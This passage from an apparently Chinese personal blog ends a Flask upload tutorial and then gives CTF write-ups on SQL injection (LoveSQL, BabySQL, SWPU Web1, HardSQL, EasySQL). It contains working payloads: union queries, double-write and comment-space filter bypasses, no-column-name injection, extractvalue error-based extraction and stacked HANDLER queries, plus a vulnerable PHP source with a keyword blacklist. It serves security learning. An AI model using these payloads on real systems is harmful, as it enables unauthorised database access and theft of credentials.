class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, flash, request, redirect, url_for,send_from_directory,render_template</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">r'E:\\flask\\upload\\'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123; <span class="string">'txt'</span>, <span class="string">'pdf'</span>, <span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line">app.secret_key = os.urandom(<span class="number">12</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span>  <span class="comment">#判断上传的文件是否非法</span></span><br><span class="line">    <span class="keyword">if</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS:</span><br><span class="line">        <span class="keyword">return</span> filename</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flash(<span class="string">'illegal file'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="comment"># check if the post request has the file part</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">            flash(<span class="string">'No file part'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'upload'</span>))</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]  </span><br><span class="line">        <span class="comment"># if user does not select file, browser also</span></span><br><span class="line">        <span class="comment"># submit an empty part without filename</span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">            flash(<span class="string">'No selected file'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):  </span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))<span class="comment">#save方法保存文件</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'uploaded_file'</span>,filename=filename))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'upload'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/uploads/&lt;filename&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploaded_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">'UPLOAD_FOLDER'</span>],filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>不得不说，官方的代码还是要强一些，当上传为空时会报错，非法文件也会报错，但上传成功后跳转到上传的文件url处</p><p> <code>UPLOAD_FOLDER</code> 是上传文 件要储存的目录， <code>ALLOWED_EXTENSIONS</code> 是允许上传的文件扩展名的集合，<code>MAX_CONTENT_LENGTH</code>是限制的上传文件的大小</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul><li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li><li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li><li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li><li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li></ul><p>参考链接：</p><blockquote><p><a href="https://dormousehole.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">https://dormousehole.readthedocs.io/en/latest/index.html</a>     （官方文档）</p><p><a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">https://www.w3cschool.cn/flask/</a>   （W3Cschool教程）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/03/25/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/25/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="极客大挑战—LoveSQL"><a href="#极客大挑战—LoveSQL" class="headerlink" title="极客大挑战—LoveSQL"></a>极客大挑战—LoveSQL</h3><p><strong>解题核心</strong> ———————- <a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc" target="_blank" rel="noopener"><strong>group_concat</strong>()</a></p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Axos1ZnBL2yN5YD.png" style="zoom: 33%;" /><p>随后开始注入查询：</p><p>经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段</p><p>查数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata ;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>最后password对应的表名应该是前面查询表名最后一个</p><p>查l0ve1ysq1表最后一列的字段内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>最终得到flag</p><h3 id="极客大挑战—BabySQL"><a href="#极客大挑战—BabySQL" class="headerlink" title="极客大挑战—BabySQL"></a>极客大挑战—BabySQL</h3><p><strong>解题核心</strong>—————–双写绕过</p><p>详细见CSDN上大佬的<a href="https://blog.csdn.net/whoim_i/article/details/102869687" target="_blank" rel="noopener">文章</a>，另外附上文章的HTML文档</p><p>解题方法和上一个题目的差不多，只是这次多了个双写绕过</p><p>查库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' uniunionon seselectlect null,null,group_concat(schema_name) frfromom infoorrmation_schema.schemata ;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect null,null,group_concat(table_name) frfromom infoorrmation_schema.tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect null,null,group_concat(column_name) frfromom infoorrmation_schema.columns;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查字段，反复尝试后发现flag在表b4bsql中的password列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect null,null,group_concat(passwoorrd) frfromom b4bsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/fC6dephA2EGPTkt.png" style="zoom: 67%;" /><p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p><p>登录后界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/y3YFO5dUm164Vbf.png" alt=""></p><p>广告申请界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CYufWMHk5dvQZXp.png" style="zoom:67%;" /><p>随便申请一个：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/JdWt2SMC1DfKNvj.png" alt=""></p><p>首页显示：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/IRm9FwGvXH81ZiT.png" style="zoom:67%;" /><p>广告详情：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png" alt=""></p><p>在广告申请界面测试后发现存在SQL注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png" alt=""></p><p>配合union查询查列数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>&amp;&amp;<span class="comment">/**/</span><span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><ul><li>过滤了–+和#，故闭合最后的单引号</li><li>过滤了空格用/**/分离参数</li></ul></blockquote><p>有22列，由广告详情界面显示可知，第2,3列可注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png" alt=""></p><p>查数据库库，数据库版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">version</span>(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><ul><li>此处利用无列名注入</li><li>过滤了information_scheam库的查询，故使用其它库进行查询，此题场景为buuctf上的复现题目，用到mysql库中的mysql.innodb_table_stats表（mysql在5.5.x版本后，默认使用innodb作为存储引擎），比赛时原题可用sys库中的sys.schema_auto_increment_columns表进行查询(mysql版本&gt;5.7时，新增了sys数据库，基础数据来自于performance_chema和information_schema两个库，但是本身数据库不存储数据)，查询语句和上面的一样</li><li>参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">官方文档</a></li><li>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li><li>参考：<a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">概述MySQL统计信息</a></li></ul></blockquote><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png" alt=""></p><p>查列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><blockquote><p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p></blockquote><p>列数错误时：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png" alt=""></p><p>然后再配合无列名注入注出user表中的flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png" alt=""></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p><p>经过测试发现过滤了：空格，=，order by，union，and</p><p>用^异或操作代替union，用updatexml()或extractvalue()报错注入，以下均使用extractvalue()函数</p><p>查库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">database</span>())))));<span class="comment">#查当前数据库</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(schema_name))<span class="keyword">from</span>(information_schema.schemata))));<span class="comment">#查所有数据库</span></span><br></pre></td></tr></table></figure><p>这里为什么没有显示当前geek数据库有点纳闷，可能是这个查询屏蔽了geek数据库</p><p>查表（like代替=进行查询）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>((table_schema)<span class="keyword">like</span><span class="string">'geek'</span>))));<span class="comment">#查geek数据库下的表</span></span><br></pre></td></tr></table></figure><p>查列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>((table_name)<span class="keyword">like</span><span class="string">'H4rDsq1'</span>))));<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查字段（限制了显示的字符串数，利用left()，right()查询）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1))));<span class="comment">#查左边</span></span><br><span class="line"></span><br><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1))));<span class="comment">#查右边</span></span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="2020ichunqiu新春公益赛—blacklist"><a href="#2020ichunqiu新春公益赛—blacklist" class="headerlink" title="2020ichunqiu新春公益赛—blacklist"></a>2020ichunqiu新春公益赛—blacklist</h3><p>这个题目可参考  [强网杯 2019]supersql</p><p>不过这题过滤的东西要多一些，常用的两种方法：</p><blockquote><p>预编译注入绕过关键词：set、prepare</p><p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p></blockquote><p>都被过滤用不了了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt=""></p><p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">详</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> cool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">next</span>;</span><br></pre></td></tr></table></figure><p>通过以上三条语句应该就能得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt=""></p><h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p><ul><li>堆叠注入</li><li>*的使用</li><li>sql_mode 的应用</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png" alt=""></p><p>听说比赛的时候泄露了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span 